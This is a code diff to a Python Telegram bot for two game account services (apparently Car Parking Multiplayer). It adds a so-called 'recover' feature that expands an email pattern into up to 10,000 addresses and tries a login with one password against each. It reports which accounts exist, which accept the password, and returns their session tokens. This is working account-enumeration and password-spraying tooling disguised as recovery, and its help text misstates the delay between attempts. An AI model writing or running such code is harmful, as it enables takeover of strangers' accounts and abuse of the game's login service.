@@ -7,6 +7,7 @@ if sys.platform.startswith("win"):
 import os
 import time
 import requests
+import re
 from telegram import Update
 from telegram.ext import (
     Application,
@@ -161,6 +162,53 @@ def update_request(id_token, api_key, new_email=None, new_password=None):
     response = requests.post(url, json=payload)
     return response.json()
 
+# ===== EMAIL RECOVERY FUNCTIONS =====
+def parse_email_pattern(pattern):
+    """
+    Parse email patterns like:
+    - tannercpm(10000)@gmail.com
+    - tannercpm(1000-10000)@gmail.com
+    Returns: (base, start, end, domain) or None if invalid
+    """
+    match = re.match(r'^([a-zA-Z0-9]+)\((\d+)(?:-(\d+))?\)@([\w\.-]+\.\w+)$', pattern)
+    if not match:
+        return None
+    
+    base, start, end, domain = match.groups()
+    start = int(start)
+    end = int(end) if end else start
+    
+    # Ensure start <= end
+    if start > end:
+        start, end = end, start
+    
+    return base, start, end, domain
+
+def generate_emails(base, start, end, domain):
+    """Generate email list from range"""
+    emails = []
+    for i in range(start, end + 1):
+        emails.append(f"{base}{i}@{domain}")
+    return emails
+
+async def check_email_exists(email, password, api_key):
+    """Check if email exists by attempting login"""
+    try:
+        resp = login_request(email, password, api_key)
+        # If we get an idToken, account exists and password is correct
+        if "idToken" in resp:
+            return "found", resp
+        # If we get an error, check what kind
+        error = resp.get("error", {}).get("message", "")
+        if "EMAIL_NOT_FOUND" in error or "INVALID_EMAIL" in error:
+            return "not_found", None
+        elif "INVALID_PASSWORD" in error:
+            return "wrong_password", None
+        else:
+            return "error", error
+    except Exception as e:
+        return "error", str(e)
+
 # ===== SESSIONS =====
 sessions = {}  # user_id -> {id_token, email, game_name, api_key}
 user_states = {}  # per-user step tracking
@@ -180,7 +228,8 @@ def build_menu_text(user_id):
 **Available Options:**
 1️⃣ Type: `changemail` - Change your email
 2️⃣ Type: `changepass` - Change your password
-3️⃣ Type: `logout` - Logout from the bot
+3️⃣ Type: `recover` - Recover account with email pattern
+4️⃣ Type: `logout` - Logout from the bot
 
 What would you like to do?
 """
@@ -192,6 +241,7 @@ You are not logged in.
 
 **Available Options:**
 1️⃣ Type: `login` - Login to your game account
+2️⃣ Type: `recover` - Recover account with email pattern
 
 What would you like to do?
 """
@@ -312,6 +362,21 @@ Which game would you like to login to?
         await update.message.reply_text("🔑 Enter your new password:")
         return
 
+    elif text == "recover":
+        game_selection = """
+🎮 **Select Your Game:**
+━━━━━━━━━━━━━━━━━━━━━━
+Type one of the following:
+
+1️⃣ Type: `cpm1` - Recover CPM1 Account
+2️⃣ Type: `cpm2` - Recover CPM2 Account
+
+Which game would you like to recover?
+"""
+        await update.message.reply_text(game_selection, parse_mode="Markdown")
+        context.user_data['step'] = 'recover_game'
+        return
+
     elif text == "logout":
         if user_id in sessions:
             del sessions[user_id]
@@ -331,6 +396,174 @@ Which game would you like to login to?
             await update.message.reply_text(f"📝 Enter your email for {game}:")
         else:
             await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
+        return
+
+    # ----- EMAIL RECOVERY GAME SELECTION -----
+    elif step == 'recover_game':
+        if text in ['cpm1', 'cpm2']:
+            game = text.upper()
+            context.user_data['recover_game'] = game
+            context.user_data['recover_api_key'] = CPM1_API_KEY if game == "CPM1" else CPM2_API_KEY
+            context.user_data['step'] = 'recover_pattern'
+            recover_help = f"""
+📧 **Email Recovery for {game}**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Enter an email pattern to check:
+
+**Examples:**
+- `tannercpm(10000)@gmail.com` - Checks emails 1 to 10000
+- `tannercpm(1000-5000)@gmail.com` - Checks emails 1000 to 5000
+- `user(100-200)@domain.com` - Custom range
+
+⚠️ **Limits:**
+- Max 10,000 emails per check
+- 5 second delay between checks to avoid rate limiting
+
+Enter your pattern:
+"""
+            await update.message.reply_text(recover_help, parse_mode="Markdown")
+        else:
+            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
+        return
+
+    # ----- EMAIL RECOVERY PATTERN -----
+    elif step == 'recover_pattern':
+        pattern = update.message.text.strip()
+        parsed = parse_email_pattern(pattern)
+        
+        if not parsed:
+            await update.message.reply_text("❌ Invalid pattern format. Use: `base(num)@domain.com` or `base(num1-num2)@domain.com`")
+            return
+        
+        base, start, end, domain = parsed
+        total = end - start + 1
+        
+        # Limit checks
+        if total > 10000:
+            await update.message.reply_text(f"❌ Range too large ({total} emails). Max 10,000 per check.")
+            return
+        
+        context.user_data['recover_password'] = None
+        context.user_data['step'] = 'recover_password_input'
+        await update.message.reply_text(f"""
+🔐 **Enter Password to Check**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Pattern: `{pattern}`
+Range: {total} emails ({start} - {end})
+
+Enter the password to check (or type 'skip' to just verify existence):
+""", parse_mode="Markdown")
+        context.user_data['recover_base'] = base
+        context.user_data['recover_start'] = start
+        context.user_data['recover_end'] = end
+        context.user_data['recover_domain'] = domain
+        return
+
+    # ----- EMAIL RECOVERY PASSWORD INPUT -----
+    elif step == 'recover_password_input':
+        password = update.message.text.strip()
+        
+        if password.lower() == 'skip':
+            context.user_data['recover_password'] = None
+        else:
+            context.user_data['recover_password'] = password
+        
+        base = context.user_data['recover_base']
+        start = context.user_data['recover_start']
+        end = context.user_data['recover_end']
+        domain = context.user_data['recover_domain']
+        game = context.user_data['recover_game']
+        api_key = context.user_data['recover_api_key']
+        password_to_check = context.user_data['recover_password']
+        
+        total = end - start + 1
+        
+        await update.message.reply_text(f"""
+🔍 **Starting Email Recovery**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Game: **{game}**
+Pattern: **{base}({start}-{end})@{domain}**
+Total: **{total} emails**
+Status: **Checking...**
+
+This may take a few minutes. Please wait.
+""", parse_mode="Markdown")
+        
+        await context.bot.send_chat_action(update.effective_chat.id, "typing")
+        
+        found_emails = []
+        checked = 0
+        
+        emails = generate_emails(base, start, end, domain)
+        
+        for email in emails:
+            checked += 1
+            
+            # Update progress every 50 emails
+            if checked % 50 == 0:
+                await update.message.reply_text(f"⏳ Progress: {checked}/{total} emails checked...", parse_mode="Markdown")
+            
+            if password_to_check:
+                # Check with password
+                result, data = await asyncio.to_thread(check_email_exists, email, password_to_check, api_key)
+                if result == "found":
+                    found_emails.append({
+                        "email": email,
+                        "status": "✅ FOUND (Correct Password)",
+                        "data": data
+                    })
+                elif result == "wrong_password":
+                    found_emails.append({
+                        "email": email,
+                        "status": "⚠️ Email exists (Wrong Password)",
+                        "data": None
+                    })
+            else:
+                # Just check if email exists (no password)
+                result, data = await asyncio.to_thread(check_email_exists, email, "temppass123", api_key)
+                if result == "found":
+                    found_emails.append({
+                        "email": email,
+                        "status": "✅ FOUND (Correct Password)",
+                        "data": data
+                    })
+                elif result == "wrong_password":
+                    found_emails.append({
+                        "email": email,
+                        "status": "⚠️ Email exists (Password unknown)",
+                        "data": None
+                    })
+            
+            # Rate limit to avoid blocking
+            await asyncio.sleep(0.5)
+        
+        # Build results
+        if found_emails:
+            results_text = f"""
+✅ **Recovery Complete**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Game: **{game}**
+Found: **{len(found_emails)} email(s)**
+
+**Results:**
+"""
+            for item in found_emails[:20]:  # Show first 20
+                results_text += f"\n{item['status']}\n`{item['email']}`"
+            
+            if len(found_emails) > 20:
+                results_text += f"\n\n... and {len(found_emails) - 20} more"
+            
+            await update.message.reply_text(results_text, parse_mode="Markdown")
+        else:
+            await update.message.reply_text(f"""
+❌ **Recovery Complete**
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+No matching emails found in the range.
+""", parse_mode="Markdown")
+        
+        await update.message.reply_text(build_menu_text(user_id), parse_mode="Markdown")
+        context.user_data.clear()
         return
 
     # ----- EMAIL -----
